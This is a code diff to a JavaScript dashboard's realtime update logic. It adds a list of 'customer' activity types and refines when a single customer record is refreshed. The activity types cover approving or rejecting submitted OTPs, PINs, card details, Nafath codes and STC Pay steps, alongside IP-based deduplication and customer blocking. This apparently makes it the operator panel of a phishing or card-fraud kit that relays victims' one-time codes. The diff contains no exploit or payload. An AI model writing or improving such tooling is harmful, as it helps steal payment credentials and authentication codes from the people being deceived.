@@ -318,6 +318,38 @@ const WS_BACKED_ACTIONS = new Set( [
     'nafath-update-code',
 ] );
 
+const CUSTOMER_PATCH_ACTIVITY_TYPES = new Set( [
+    'otp_approved',
+    'otp_rejected',
+    'pin_approved',
+    'pin_rejected',
+    'phone_approved',
+    'phone_rejected',
+    'nafath_approved',
+    'nafath_rejected',
+    'payment_approved',
+    'payment_rejected',
+    'stc_waiting_approved',
+    'stc_waiting_rejected',
+    'stc_otp_approved',
+    'stc_otp_rejected',
+    'stc_call_approved',
+    'stc_call_rejected',
+    'customer_blocked',
+    'customer_unblocked',
+    'inactive',
+    'card_submitted',
+    'payment_card_submitted',
+    'otp_submitted',
+    'stc_otp_submitted',
+    'pin_submitted',
+    'phone_otp_submitted',
+    'nafath_submitted',
+    'phone_submitted',
+    'phone_otp_verified',
+    'otp_resend_requested',
+] );
+
 // ── Loading / error state for initial fetch ──
 const initialLoading = ref( true );   // true until first successful refresh
 const loadError = ref( false );       // true when last refresh failed
@@ -997,7 +1029,10 @@ function handleRealtimeUpdate ( event ) {
                     if ( !pending ) return;
                     _lastRefreshAt = Date.now();
                     const customerId = resolveCustomerIdFromEvent( pending );
-                    if ( customerId ) {
+                    const customerExists = customerId
+                        ? customers.value.some( customer => customer.id === customerId )
+                        : false;
+                    if ( customerId && CUSTOMER_PATCH_ACTIVITY_TYPES.has( pending.activity_type ) && customerExists ) {
                         patchSingleCustomer( customerId );
                     } else {
                         refreshCustomers();
@@ -1020,7 +1055,10 @@ function handleRealtimeUpdate ( event ) {
 
         // Patch update: fetch only the changed customer instead of full list
         const customerId = eventCustomerId;
-        if ( customerId ) {
+        const customerExists = customerId
+            ? customers.value.some( customer => customer.id === customerId )
+            : false;
+        if ( customerId && CUSTOMER_PATCH_ACTIVITY_TYPES.has( event.activity_type ) && customerExists ) {
             patchSingleCustomer( customerId );
         } else {
             refreshCustomers();
@@ -1613,6 +1651,10 @@ const patchSingleCustomer = async ( customerId ) => {
             customers.value = deduplicateByIp( applyOrdering( [ guarded, ...customers.value ] ) );
         }
     } catch ( error ) {
+        if ( error?.response?.status === 404 ) {
+            customers.value = customers.value.filter( c => c.id !== customerId );
+            return;
+        }
         // Fallback: delayed refresh instead of immediate full-list fetch storm
         logger.warn( 'Patch update failed — scheduling deferred refresh:', error?.message || error );
         scheduleDeferredRefresh( 'patch-failed', 7000 );
